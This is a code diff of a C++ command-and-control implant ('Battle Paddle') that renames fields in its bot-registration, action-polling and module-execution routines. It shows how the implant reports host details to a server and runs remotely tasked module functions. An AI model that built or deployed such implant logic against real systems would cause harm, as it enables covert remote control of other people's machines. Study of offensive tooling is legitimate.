@@ -55,21 +55,21 @@ void LogicController::RegisterBot() {
 
 // TODO Get this stuff
   registration_request.hostname = "Meep";
-  registration_request.MAC = "aa:ss:dd:ff:gg:hh";
-  registration_request.implantVersion = "1337";
-  registration_request.IP = this->implant_info_.primaryIP;
-  registration_request.implantName = "Battle Paddle";
-  registration_request.OS = "Windows trash";
-  registration_request.supportedModules = values;
+  registration_request.mac = "aa:ss:dd:ff:gg:hh";
+  registration_request.implant_version = "1337";
+  registration_request.ip = this->implant_info_.primary_ip;
+  registration_request.implant_name = "Battle Paddle";
+  registration_request.os = "Windows trash";
+  registration_request.supported_modules = values;
 //******************
 
   nlohmann::json j = nlohmann::json(registration_request);
 
 // TODO determine fingerprint
   packet.fingerprint = "fingerprint";
-  packet.implantInfo = this->implant_info_;
-  packet.numLeft = 0;
-  packet.packetType = REGISTRATION_REQUEST_CODE;
+  packet.implant_info = this->implant_info_;
+  packet.num_left = 0;
+  packet.packet_type = REGISTRATION_REQUEST_CODE;
   packet.data = j.dump();
 
   nlohmann::json p = nlohmann::json(packet);
@@ -85,25 +85,25 @@ void LogicController::RegisterBot() {
   try {
     nlohmann::json resp = nlohmann::json::parse(response);
     auto packet_resp = resp.get<std::vector<Packet>>();
-    if (packet_resp[0].packetType == REGISTRATION_RESPONSE_CODE) {
-      DEBUG("Packet type received: " << packet_resp[0].packetType, LEVEL_DEBUG);
+    if (packet_resp[0].packet_type == REGISTRATION_RESPONSE_CODE) {
+      DEBUG("Packet type received: " << packet_resp[0].packet_type, LEVEL_DEBUG);
       auto inner_data = nlohmann::json::parse(packet_resp[0].data);
       auto reg_resp = inner_data.get<RegistrationResponse>();
-      this->implant_info_.UUID = reg_resp.UUID;
-    } else if (packet_resp[0].packetType == ERROR_CODE) {
-      DEBUG("Packet type received: " << packet_resp[0].packetType, LEVEL_DEBUG);
+      this->implant_info_.uuid = reg_resp.uuid;
+    } else if (packet_resp[0].packet_type == ERROR_CODE) {
+      DEBUG("Packet type received: " << packet_resp[0].packet_type, LEVEL_DEBUG);
       auto inner_data = nlohmann::json::parse(packet_resp[0].data);
       auto reg_error = inner_data.get<Error>();
-      DEBUG("Error with registration: " << reg_error.errorNum, LEVEL_ERROR);
-      if (reg_error.errorNum == DUPLICATE_REGISTRATION) {
+      DEBUG("Error with registration: " << reg_error.error_num, LEVEL_ERROR);
+      if (reg_error.error_num == DUPLICATE_REGISTRATION) {
         DEBUG("Was previously registered, received UUID", LEVEL_DEBUG);
-        this->implant_info_.UUID = packet_resp[0].implantInfo.UUID;
+        this->implant_info_.uuid = packet_resp[0].implant_info.uuid;
         return;
       }
       this->SetError();
       return;
     } else {
-      DEBUG("Unexpected packet type: " << packet_resp[0].packetType, LEVEL_ERROR);
+      DEBUG("Unexpected packet type: " << packet_resp[0].packet_type, LEVEL_ERROR);
       this->SetError();
       return;
     }
@@ -157,16 +157,16 @@ void LogicController::FuncExecutor(const std::string &mod,
   struct ActionResponse action_response{};
   struct Packet packet;
 
-  action_response.actionId = action_id;
+  action_response.action_id = action_id;
   //TODO try catch
   action_response.response = this->modules_[mod]->func_map_[func](data);
 
   nlohmann::json r = nlohmann::json(action_response);
 
   packet.fingerprint = "fingerprint";
-  packet.implantInfo = this->implant_info_;
-  packet.numLeft = 0;
-  packet.packetType = ACTION_RESPONSE_CODE;
+  packet.implant_info = this->implant_info_;
+  packet.num_left = 0;
+  packet.packet_type = ACTION_RESPONSE_CODE;
   packet.data = r.dump();
 
   nlohmann::json p = nlohmann::json(packet);
@@ -193,7 +193,7 @@ void LogicController::CreateFuncExecutor(const std::string &mod,
 }
 
 void LogicController::BeginComms() {
-  if (this->implant_info_.UUID.empty()) {
+  if (this->implant_info_.uuid.empty()) {
     this->SetError();
     return;
   }
@@ -202,9 +202,9 @@ void LogicController::BeginComms() {
   struct Packet packet;
 
   packet.fingerprint = "fingerprint";
-  packet.implantInfo = this->implant_info_;
-  packet.numLeft = 0;
-  packet.packetType = ACTION_REQUEST;
+  packet.implant_info = this->implant_info_;
+  packet.num_left = 0;
+  packet.packet_type = ACTION_REQUEST;
   packet.data = "";
 
   nlohmann::json p = nlohmann::json(packet);
@@ -225,20 +225,20 @@ void LogicController::BeginComms() {
       auto packet_resps = resp.get<std::vector<Packet>>();
       DEBUG("PARSED PACKET", LEVEL_DEBUG);
       for (auto packet_resp : packet_resps) {
-        DEBUG("Packet type received: " << packet_resp.packetType, LEVEL_DEBUG);
-        if (packet_resp.packetType == ACTION_CODE) {
+        DEBUG("Packet type received: " << packet_resp.packet_type, LEVEL_DEBUG);
+        if (packet_resp.packet_type == ACTION_CODE) {
           DEBUG("Received an action", LEVEL_INFO);
           auto inner_data = nlohmann::json::parse(packet_resp.data);
           auto action = inner_data.get<Action>();
-          CreateFuncExecutor(action.module, action.moduleFunc, action.arguments, action.actionId);
-        } else if (packet_resp.packetType == ERROR_CODE) {
+          CreateFuncExecutor(action.module, action.module_func, action.arguments, action.action_id);
+        } else if (packet_resp.packet_type == ERROR_CODE) {
           auto inner_data = nlohmann::json::parse(packet_resp.data);
           auto reg_error = inner_data.get<Error>();
-          DEBUG("Error with packet: " << reg_error.errorNum, LEVEL_ERROR);
-        } else if (packet_resp.packetType == NO_ACTION) {
+          DEBUG("Error with packet: " << reg_error.error_num, LEVEL_ERROR);
+        } else if (packet_resp.packet_type == NO_ACTION) {
           DEBUG("No Actions", LEVEL_INFO);
         } else {
-          DEBUG("Unexpected packet type: " << packet_resp.packetType, LEVEL_ERROR);
+          DEBUG("Unexpected packet type: " << packet_resp.packet_type, LEVEL_ERROR);
         }
       }
     } catch (...) {
